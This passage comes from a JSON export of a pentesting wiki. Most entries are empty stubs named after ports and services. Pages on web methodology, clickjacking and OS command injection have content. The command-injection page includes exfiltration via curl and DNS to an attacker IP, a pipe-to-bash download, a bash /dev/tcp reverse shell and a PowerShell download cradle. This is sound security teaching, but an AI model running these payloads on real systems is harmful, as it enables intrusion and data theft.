       "type": "page",
       "children": [],
       "tag": "TAG-0523",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Werkzeug / Flask Debug",
       "slug": "werkzeug-flask-debug",
       "type": "page",
       "children": [],
       "tag": "TAG-0524",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Wordpress",
       "slug": "wordpress",
       "type": "page",
       "children": [],
       "tag": "TAG-0525",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0446",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "88tcp/udp - Pentesting Kerberos",
     "slug": "88tcpudp---pentesting-kerberos",
     "type": "page",
     "children": [
      {
       "title": "Harvesting tickets from Windows",
       "slug": "harvesting-tickets-from-windows",
       "type": "page",
       "children": [],
       "tag": "TAG-0527",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Harvesting tickets from Linux",
       "slug": "harvesting-tickets-from-linux",
       "type": "page",
       "children": [],
       "tag": "TAG-0528",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Wsgi",
       "slug": "wsgi",
       "type": "page",
       "children": [],
       "tag": "TAG-0529",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Zabbix",
       "slug": "zabbix",
       "type": "page",
       "children": [],
       "tag": "TAG-0530",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0526",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "110,995 - Pentesting POP",
     "slug": "110995---pentesting-pop",
     "type": "page",
     "children": [],
     "tag": "TAG-0531",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "111/TCP/UDP - Pentesting Portmapper",
     "slug": "111tcpudp---pentesting-portmapper",
     "type": "page",
     "children": [],
     "tag": "TAG-0532",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "113 - Pentesting Ident",
     "slug": "113---pentesting-ident",
     "type": "page",
     "children": [],
     "tag": "TAG-0533",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "123/udp - Pentesting NTP",
     "slug": "123udp---pentesting-ntp",
     "type": "page",
     "children": [],
     "tag": "TAG-0534",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "135, 593 - Pentesting MSRPC",
     "slug": "135-593---pentesting-msrpc",
     "type": "page",
     "children": [],
     "tag": "TAG-0535",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "137,138,139 - Pentesting NetBios",
     "slug": "137138139---pentesting-netbios",
     "type": "page",
     "children": [],
     "tag": "TAG-0536",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "139,445 - Pentesting SMB",
     "slug": "139445---pentesting-smb",
     "type": "page",
     "children": [
      {
       "title": "Ksmbd Attack Surface And Fuzzing Syzkaller",
       "slug": "ksmbd-attack-surface-and-fuzzing-syzkaller",
       "type": "page",
       "children": [],
       "tag": "TAG-0538",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "rpcclient enumeration",
       "slug": "rpcclient-enumeration",
       "type": "page",
       "children": [],
       "tag": "TAG-0539",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0537",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "143,993 - Pentesting IMAP",
     "slug": "143993---pentesting-imap",
     "type": "page",
     "children": [],
     "tag": "TAG-0540",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "161,162,10161,10162/udp - Pentesting SNMP",
     "slug": "1611621016110162udp---pentesting-snmp",
     "type": "page",
     "children": [
      {
       "title": "Cisco SNMP",
       "slug": "cisco-snmp",
       "type": "page",
       "children": [],
       "tag": "TAG-0542",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SNMP RCE",
       "slug": "snmp-rce",
       "type": "page",
       "children": [],
       "tag": "TAG-0543",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0541",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "194,6667,6660-7000 - Pentesting IRC",
     "slug": "19466676660-7000---pentesting-irc",
     "type": "page",
     "children": [],
     "tag": "TAG-0544",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "264 - Pentesting Check Point FireWall-1",
     "slug": "264---pentesting-check-point-firewall-1",
     "type": "page",
     "children": [],
     "tag": "TAG-0545",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "389, 636, 3268, 3269 - Pentesting LDAP",
     "slug": "389-636-3268-3269---pentesting-ldap",
     "type": "page",
     "children": [],
     "tag": "TAG-0546",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "500/udp - Pentesting IPsec/IKE VPN",
     "slug": "500udp---pentesting-ipsecike-vpn",
     "type": "page",
     "children": [],
     "tag": "TAG-0547",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "502 - Pentesting Modbus",
     "slug": "502---pentesting-modbus",
     "type": "page",
     "children": [],
     "tag": "TAG-0548",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "512 - Pentesting Rexec",
     "slug": "512---pentesting-rexec",
     "type": "page",
     "children": [],
     "tag": "TAG-0549",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "513 - Pentesting Rlogin",
     "slug": "513---pentesting-rlogin",
     "type": "page",
     "children": [],
     "tag": "TAG-0550",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "514 - Pentesting Rsh",
     "slug": "514---pentesting-rsh",
     "type": "page",
     "children": [],
     "tag": "TAG-0551",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "515 - Pentesting Line Printer Daemon (LPD)",
     "slug": "515---pentesting-line-printer-daemon-lpd",
     "type": "page",
     "children": [],
     "tag": "TAG-0552",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "548 - Pentesting Apple Filing Protocol (AFP)",
     "slug": "548---pentesting-apple-filing-protocol-afp",
     "type": "page",
     "children": [],
     "tag": "TAG-0553",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "554,8554 - Pentesting RTSP",
     "slug": "5548554---pentesting-rtsp",
     "type": "page",
     "children": [],
     "tag": "TAG-0554",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "623/UDP/TCP - IPMI",
     "slug": "623udptcp---ipmi",
     "type": "page",
     "children": [],
     "tag": "TAG-0555",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "631 - Internet Printing Protocol(IPP)",
     "slug": "631---internet-printing-protocolipp",
     "type": "page",
     "children": [],
     "tag": "TAG-0556",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "700 - Pentesting EPP",
     "slug": "700---pentesting-epp",
     "type": "page",
     "children": [],
     "tag": "TAG-0557",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "873 - Pentesting Rsync",
     "slug": "873---pentesting-rsync",
     "type": "page",
     "children": [],
     "tag": "TAG-0558",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "1026 - Pentesting Rusersd",
     "slug": "1026---pentesting-rusersd",
     "type": "page",
     "children": [],
     "tag": "TAG-0559",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "1080 - Pentesting Socks",
     "slug": "1080---pentesting-socks",
     "type": "page",
     "children": [],
     "tag": "TAG-0560",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "1098/1099/1050 - Pentesting Java RMI - RMI-IIOP",
     "slug": "109810991050---pentesting-java-rmi---rmi-iiop",
     "type": "page",
     "children": [],
     "tag": "TAG-0561",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "1414 - Pentesting IBM MQ",
     "slug": "1414---pentesting-ibm-mq",
     "type": "page",
     "children": [],
     "tag": "TAG-0562",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "1433 - Pentesting MSSQL - Microsoft SQL Server",
     "slug": "1433---pentesting-mssql---microsoft-sql-server",
     "type": "page",
     "children": [
      {
       "title": "Types of MSSQL Users",
       "slug": "types-of-mssql-users",
       "type": "page",
       "children": [],
       "tag": "TAG-0564",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0563",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "1521,1522-1529 - Pentesting Oracle TNS Listener",
     "slug": "15211522-1529---pentesting-oracle-tns-listener",
     "type": "page",
     "children": [],
     "tag": "TAG-0565",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "1723 - Pentesting PPTP",
     "slug": "1723---pentesting-pptp",
     "type": "page",
     "children": [],
     "tag": "TAG-0566",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "1883 - Pentesting MQTT (Mosquitto)",
     "slug": "1883---pentesting-mqtt-mosquitto",
     "type": "page",
     "children": [],
     "tag": "TAG-0567",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Pentesting ISO 8583 Payment Sockets",
     "slug": "pentesting-iso-8583-payment-sockets",
     "type": "page",
     "children": [],
     "tag": "TAG-0568",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "2049 - Pentesting NFS Service",
     "slug": "2049---pentesting-nfs-service",
     "type": "page",
     "children": [],
     "tag": "TAG-0569",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "2301,2381 - Pentesting Compaq/HP Insight Manager",
     "slug": "23012381---pentesting-compaqhp-insight-manager",
     "type": "page",
     "children": [],
     "tag": "TAG-0570",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "2375, 2376 Pentesting Docker",
     "slug": "2375-2376-pentesting-docker",
     "type": "page",
     "children": [],
     "tag": "TAG-0571",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "3128 - Pentesting Squid",
     "slug": "3128---pentesting-squid",
     "type": "page",
     "children": [],
     "tag": "TAG-0572",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "3260 - Pentesting ISCSI",
     "slug": "3260---pentesting-iscsi",
     "type": "page",
     "children": [],
     "tag": "TAG-0573",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "3299 - Pentesting SAPRouter",
     "slug": "3299---pentesting-saprouter",
     "type": "page",
     "children": [],
     "tag": "TAG-0574",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "3306 - Pentesting Mysql",
     "slug": "3306---pentesting-mysql",
     "type": "page",
     "children": [],
     "tag": "TAG-0575",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "3389 - Pentesting RDP",
     "slug": "3389---pentesting-rdp",
     "type": "page",
     "children": [],
     "tag": "TAG-0576",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "3632 - Pentesting distcc",
     "slug": "3632---pentesting-distcc",
     "type": "page",
     "children": [],
     "tag": "TAG-0577",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "3690 - Pentesting Subversion (svn server)",
     "slug": "3690---pentesting-subversion-svn-server",
     "type": "page",
     "children": [],
     "tag": "TAG-0578",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "3702/UDP - Pentesting WS-Discovery",
     "slug": "3702udp---pentesting-ws-discovery",
     "type": "page",
     "children": [],
     "tag": "TAG-0579",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "4369 - Pentesting Erlang Port Mapper Daemon (epmd)",
     "slug": "4369---pentesting-erlang-port-mapper-daemon-epmd",
     "type": "page",
     "children": [],
     "tag": "TAG-0580",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "4786 - Cisco Smart Install",
     "slug": "4786---cisco-smart-install",
     "type": "page",
     "children": [],
     "tag": "TAG-0581",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "4840 - OPC Unified Architecture",
     "slug": "4840---opc-unified-architecture",
     "type": "page",
     "children": [],
     "tag": "TAG-0582",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5000 - Pentesting Docker Registry",
     "slug": "5000---pentesting-docker-registry",
     "type": "page",
     "children": [],
     "tag": "TAG-0583",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5353/UDP Multicast DNS (mDNS) and DNS-SD",
     "slug": "5353udp-multicast-dns-mdns-and-dns-sd",
     "type": "page",
     "children": [],
     "tag": "TAG-0584",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5432,5433 - Pentesting Postgresql",
     "slug": "54325433---pentesting-postgresql",
     "type": "page",
     "children": [],
     "tag": "TAG-0585",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5439 - Pentesting Redshift",
     "slug": "5439---pentesting-redshift",
     "type": "page",
     "children": [],
     "tag": "TAG-0586",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5555 - Android Debug Bridge",
     "slug": "5555---android-debug-bridge",
     "type": "page",
     "children": [],
     "tag": "TAG-0587",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5601 - Pentesting Kibana",
     "slug": "5601---pentesting-kibana",
     "type": "page",
     "children": [],
     "tag": "TAG-0588",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5671,5672 - Pentesting AMQP",
     "slug": "56715672---pentesting-amqp",
     "type": "page",
     "children": [],
     "tag": "TAG-0589",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5800,5801,5900,5901 - Pentesting VNC",
     "slug": "5800580159005901---pentesting-vnc",
     "type": "page",
     "children": [],
     "tag": "TAG-0590",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5984,6984 - Pentesting CouchDB",
     "slug": "59846984---pentesting-couchdb",
     "type": "page",
     "children": [],
     "tag": "TAG-0591",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5985,5986 - Pentesting WinRM",
     "slug": "59855986---pentesting-winrm",
     "type": "page",
     "children": [],
     "tag": "TAG-0592",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "5985,5986 - Pentesting OMI",
     "slug": "59855986---pentesting-omi",
     "type": "page",
     "children": [],
     "tag": "TAG-0593",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "6000 - Pentesting X11",
     "slug": "6000---pentesting-x11",
     "type": "page",
     "children": [],
     "tag": "TAG-0594",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "6379 - Pentesting Redis",
     "slug": "6379---pentesting-redis",
     "type": "page",
     "children": [],
     "tag": "TAG-0595",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "8009 - Pentesting Apache JServ Protocol (AJP)",
     "slug": "8009---pentesting-apache-jserv-protocol-ajp",
     "type": "page",
     "children": [],
     "tag": "TAG-0596",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "8086 - Pentesting InfluxDB",
     "slug": "8086---pentesting-influxdb",
     "type": "page",
     "children": [],
     "tag": "TAG-0597",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "8089 - Pentesting Splunkd",
     "slug": "8089---pentesting-splunkd",
     "type": "page",
     "children": [],
     "tag": "TAG-0598",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "8333,18333,38333,18444 - Pentesting Bitcoin",
     "slug": "8333183333833318444---pentesting-bitcoin",
     "type": "page",
     "children": [],
     "tag": "TAG-0599",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "9000 - Pentesting FastCGI",
     "slug": "9000---pentesting-fastcgi",
     "type": "page",
     "children": [],
     "tag": "TAG-0600",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "9001 - Pentesting HSQLDB",
     "slug": "9001---pentesting-hsqldb",
     "type": "page",
     "children": [],
     "tag": "TAG-0601",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "9042/9160 - Pentesting Cassandra",
     "slug": "90429160---pentesting-cassandra",
     "type": "page",
     "children": [],
     "tag": "TAG-0602",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "9100 - Pentesting Raw Printing (JetDirect, AppSocket, PDL-datastream)",
     "slug": "9100---pentesting-raw-printing-jetdirect-appsocket-pdl-datas",
     "type": "page",
     "children": [],
     "tag": "TAG-0603",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "9200 - Pentesting Elasticsearch",
     "slug": "9200---pentesting-elasticsearch",
     "type": "page",
     "children": [],
     "tag": "TAG-0604",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "10000 - Pentesting Network Data Management Protocol (ndmp)",
     "slug": "10000---pentesting-network-data-management-protocol-ndmp",
     "type": "page",
     "children": [],
     "tag": "TAG-0605",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "11211 - Pentesting Memcache",
     "slug": "11211---pentesting-memcache",
     "type": "page",
     "children": [
      {
       "title": "Memcache Commands",
       "slug": "memcache-commands",
       "type": "page",
       "children": [],
       "tag": "TAG-0607",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0606",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "12346/udp - Pentesting Cisco Catalyst SD-WAN Control Plane",
     "slug": "12346udp---pentesting-cisco-catalyst-sd-wan-control-plane",
     "type": "page",
     "children": [],
     "tag": "TAG-0608",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "15672 - Pentesting RabbitMQ Management",
     "slug": "15672---pentesting-rabbitmq-management",
     "type": "page",
     "children": [],
     "tag": "TAG-0609",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "24007,24008,24009,49152 - Pentesting GlusterFS",
     "slug": "24007240082400949152---pentesting-glusterfs",
     "type": "page",
     "children": [],
     "tag": "TAG-0610",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "27017,27018 - Pentesting MongoDB",
     "slug": "2701727018---pentesting-mongodb",
     "type": "page",
     "children": [],
     "tag": "TAG-0611",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "32100 Udp - Pentesting Pppp Cs2 P2p Cameras",
     "slug": "32100-udp---pentesting-pppp-cs2-p2p-cameras",
     "type": "page",
     "children": [],
     "tag": "TAG-0612",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "44134 - Pentesting Tiller (Helm)",
     "slug": "44134---pentesting-tiller-helm",
     "type": "page",
     "children": [],
     "tag": "TAG-0613",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "44818/UDP/TCP - Pentesting EthernetIP",
     "slug": "44818udptcp---pentesting-ethernetip",
     "type": "page",
     "children": [],
     "tag": "TAG-0614",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "47808/udp - Pentesting BACNet",
     "slug": "47808udp---pentesting-bacnet",
     "type": "page",
     "children": [],
     "tag": "TAG-0615",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "50030,50060,50070,50075,50090 - Pentesting Hadoop",
     "slug": "5003050060500705007550090---pentesting-hadoop",
     "type": "page",
     "children": [],
     "tag": "TAG-0616",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#4FD1C5"
  },
  {
   "title": "🕸️ Pentesting Web",
   "slug": "pentesting-web",
   "type": "category",
   "children": [
    {
     "title": "Web Vulnerabilities Methodology",
     "slug": "web-vulnerabilities-methodology",
     "type": "page",
     "children": [],
     "tag": "TAG-0617",
     "content": "# Web Application Testing Methodology\n\n## Recon on the App Itself\n- Map every input: URL params, form fields, headers, cookies, JSON body fields, file uploads.\n- Identify the tech stack (framework, server, language) from headers, error pages, and file extensions — informs which vuln classes are likely.\n- Crawl authenticated *and* unauthenticated to catch access-control differences.\n\n## Systematic Pass by Vulnerability Class\n| Class | What to try first |\n|---|---|\n| Injection (SQL/NoSQL/Command) | Single quote, backtick, `;`, `\\|`, boolean-based payloads, timing payloads |\n| XSS | `<script>alert(1)</script>`, context-aware payloads (attribute, JS string, URL context) |\n| Access Control (IDOR/BAC) | Change object IDs, swap between two test accounts' tokens on each other's requests |\n| SSRF | Point any \"fetch a URL\" feature at `http://169.254.169.254/` (cloud metadata) and internal IP ranges |\n| Auth/Session | Test password reset token entropy/expiry, JWT `alg:none`, session fixation |\n| File Upload | Extension bypass, content-type spoofing, polyglot files, path traversal in filename |\n| Business Logic | Race conditions on payments/coupons, negative quantities, workflow step-skipping |\n\n## Practical Workflow\n1. **Unauthenticated crawl** — note every endpoint, technology fingerprint.\n2. **Authenticated crawl** as lowest-privilege user — repeat for each role if multiple exist.\n3. **Diff privilege levels** — anything a low-priv user can reach that they shouldn't (IDOR/BAC is the single most common real-world finding).\n4. **Parameter-by-parameter injection testing** on anything that touches a backend query, command, or file path.\n5. **Client-side review** — JS files often contain API endpoints never linked in the UI, hardcoded keys, or debug flags.\n\n## Burp Suite Workflow Tips\n- Use **Match & Replace** to auto-inject a canary/marker into every request for later log correlation.\n- **Intruder** for systematic parameter fuzzing; **Repeater** for manual chained requests (great for race conditions with \"Send group in parallel\").\n- Always check the **Logger**/history for endpoints hit by the app itself that you never manually visited (background API calls, telemetry, hidden features).\n\n## Don't Forget\n- HTTP methods other than GET/POST (PUT, DELETE, PATCH, TRACE) — often unauthenticated on the same endpoint that's protected on GET.\n- Verbose error messages/stack traces — trigger them deliberately (malformed input) for stack traces that leak file paths, DB type, or internal hostnames.\n- `robots.txt`, `.git/`, `.env`, backup files (`.bak`, `~`), and common admin paths.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Reflecting Techniques - PoCs and Polygloths CheatSheet",
     "slug": "reflecting-techniques---pocs-and-polygloths-cheatsheet",
     "type": "page",
     "children": [
      {
       "title": "Web Vulns List",
       "slug": "web-vulns-list",
       "type": "page",
       "children": [],
       "tag": "TAG-0619",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0618",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "2FA/MFA/OTP Bypass",
     "slug": "2famfaotp-bypass",
     "type": "page",
     "children": [],
     "tag": "TAG-0620",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Account Takeover",
     "slug": "account-takeover",
     "type": "page",
     "children": [],
     "tag": "TAG-0621",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Browser Extension Pentesting Methodology",
     "slug": "browser-extension-pentesting-methodology",
     "type": "page",
     "children": [
      {
       "title": "BrowExt - ClickJacking",
       "slug": "browext---clickjacking",
       "type": "page",
       "children": [],
       "tag": "TAG-0623",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "BrowExt - permissions & host_permissions",
       "slug": "browext---permissions-hostpermissions",
       "type": "page",
       "children": [],
       "tag": "TAG-0624",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "BrowExt - XSS Example",
       "slug": "browext---xss-example",
       "type": "page",
       "children": [],
       "tag": "TAG-0625",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Forced Extension Load Preferences Mac Forgery Windows",
       "slug": "forced-extension-load-preferences-mac-forgery-windows",
       "type": "page",
       "children": [],
       "tag": "TAG-0626",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0622",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Bypass Payment Process",
     "slug": "bypass-payment-process",
     "type": "page",
     "children": [],
     "tag": "TAG-0627",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Captcha Bypass",
     "slug": "captcha-bypass",
     "type": "page",
     "children": [],
     "tag": "TAG-0628",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Cache Poisoning and Cache Deception",
     "slug": "cache-poisoning-and-cache-deception",
     "type": "page",
     "children": [
      {
       "title": "Cache Poisoning via URL discrepancies",
       "slug": "cache-poisoning-via-url-discrepancies",
       "type": "page",
       "children": [],
       "tag": "TAG-0630",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Cache Poisoning to DoS",
       "slug": "cache-poisoning-to-dos",
       "type": "page",
       "children": [],
       "tag": "TAG-0631",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0629",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Clickjacking",
     "slug": "clickjacking",
     "type": "page",
     "children": [],
     "tag": "TAG-0632",
     "content": "# Clickjacking\n\n## Concept\nAn attacker loads the target site inside an invisible (or disguised) `<iframe>`, layers deceptive content on top, and tricks the victim into clicking something on the *hidden* target page while believing they're interacting with the attacker's visible page — abusing the victim's own authenticated session.\n\n## Basic PoC\n```html\n<style>\n  iframe {\n    position: absolute;\n    top: 0; left: 0;\n    width: 500px; height: 500px;\n    opacity: 0.0001;         /* invisible but still clickable */\n    z-index: 2;\n  }\n  .decoy {\n    position: absolute;\n    top: 0; left: 0;\n    z-index: 1;\n  }\n</style>\n<div class=\"decoy\">\n  <button style=\"position:absolute; top:250px; left:150px;\">Click here to win a prize!</button>\n</div>\n<iframe src=\"https://target.com/account/delete-confirm\"></iframe>\n```\nThe invisible iframe is positioned so the target's real \"Confirm Delete\" button sits exactly under the decoy \"win a prize\" button.\n\n## High-Impact Targets\n- Account deletion / deactivation confirmations\n- Privacy/security setting toggles (e.g., \"make profile public,\" \"disable 2FA\")\n- Financial actions (fund transfers, subscription changes) where a single click completes the action\n- OAuth consent screens — tricking a user into approving a malicious app's permission request\n\n## Testing Whether a Page Is Vulnerable\n```bash\ncurl -sI https://target.com/sensitive-page | grep -i \"x-frame-options\\|content-security-policy\"\n```\nThen confirm practically — host a minimal PoC iframe page and see if the target actually renders inside it in a real browser (headers can be present but misconfigured, e.g. `X-Frame-Options: ALLOWALL` which is not a valid value and gets ignored by some browsers, silently failing open).\n\n## Defenses to Check For (and Their Gaps)\n| Defense | Gap to test |\n|---|---|\n| `X-Frame-Options: DENY/SAMEORIGIN` | Legacy header, doesn't support fine-grained origin lists like CSP does |\n| `Content-Security-Policy: frame-ancestors` | Check it's actually present *and* correctly scoped — a wildcard or missing directive defeats it |\n| JS frame-busting (`if (top != self) top.location = self.location`) | Can sometimes be defeated with `sandbox=\"allow-forms\"` on the attacker's iframe, which blocks the busting script's ability to navigate the top frame |\n\n## Double-Iframe / Nested Framing Bypass (Historical)\nOlder frame-busting scripts checking only `top != self` could sometimes be bypassed by nesting the target in a second iframe layer — largely mitigated by modern CSP `frame-ancestors`, but still worth testing on legacy applications relying solely on JS-based busting.\n\n## Prevention (for reports)\nSet `Content-Security-Policy: frame-ancestors 'self'` (or an explicit allowlist) as the primary defense — it's more flexible and better supported than `X-Frame-Options`, though shipping both together maximizes compatibility with older browsers.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Client Side Template Injection (CSTI)",
     "slug": "client-side-template-injection-csti",
     "type": "page",
     "children": [],
     "tag": "TAG-0633",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Client Side Path Traversal",
     "slug": "client-side-path-traversal",
     "type": "page",
     "children": [],
     "tag": "TAG-0634",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Command Injection",
     "slug": "command-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0635",
     "content": "# OS Command Injection\n\n## Detection Payloads\n```\n; id\n| id\n|| id\n& id\n`id`\n$(id)\n```\nTry each separator — the app might filter some but not others.\n\n## Blind Command Injection (no output returned)\n```\n; ping -c 4 <your-ip>            # confirm via ICMP on your listener\n; curl http://<your-ip>/$(whoami)  # exfil data via the request itself\n; nslookup $(whoami).<your-oob-domain>   # DNS exfil, works even through egress-filtered networks\n```\n\n## Filter Bypass Techniques\n| Blocked | Bypass |\n|---|---|\n| Spaces filtered | `${IFS}`, `<`, `{cat,/etc/passwd}` |\n| Specific commands blocked | Path manipulation: `/bin/c?t /etc/passwd`, wildcards `/???/??t /etc/passwd` |\n| Blacklisted characters | Encoding, or use `$@` between characters: `w$@get` |\n| Length limit | Chain shorter commands, use variables to build the payload incrementally |\n\n## Getting a Shell From Blind Injection\n```\n; curl http://<your-ip>/shell.sh | bash\n; bash -i >& /dev/tcp/<your-ip>/4444 0>&1\n```\n\n## Windows Equivalent\n```\n& whoami\n| whoami\n&& whoami\n```\nPowerShell-specific: `; iex(new-object net.webclient).downloadstring('http://<ip>/payload.ps1')`\n\n## Where to Look\nAnything that shells out to the OS under the hood: image conversion/resizing tools, PDF generators, ping/traceroute \"diagnostic\" features, backup/export functionality, and any \"run a report\" feature that builds a filename or command from user input.\n\n## Prevention\nAvoid shelling out entirely where possible; if unavoidable, use language-native APIs that pass arguments as an array (never a concatenated string), and strictly allowlist expected input.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Content Security Policy (CSP) Bypass",
     "slug": "content-security-policy-csp-bypass",
     "type": "page",
     "children": [
      {
       "title": "CSP bypass: self + 'unsafe-inline' with Iframes",
       "slug": "csp-bypass-self-unsafe-inline-with-iframes",
       "type": "page",
       "children": [],
       "tag": "TAG-0637",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0636",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Cookies Hacking",
     "slug": "cookies-hacking",
     "type": "page",
     "children": [
      {
       "title": "Cookie Tossing",
       "slug": "cookie-tossing",
       "type": "page",
       "children": [],
       "tag": "TAG-0639",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Cookie Jar Overflow",
       "slug": "cookie-jar-overflow",
       "type": "page",
       "children": [],
       "tag": "TAG-0640",
       "content": "",
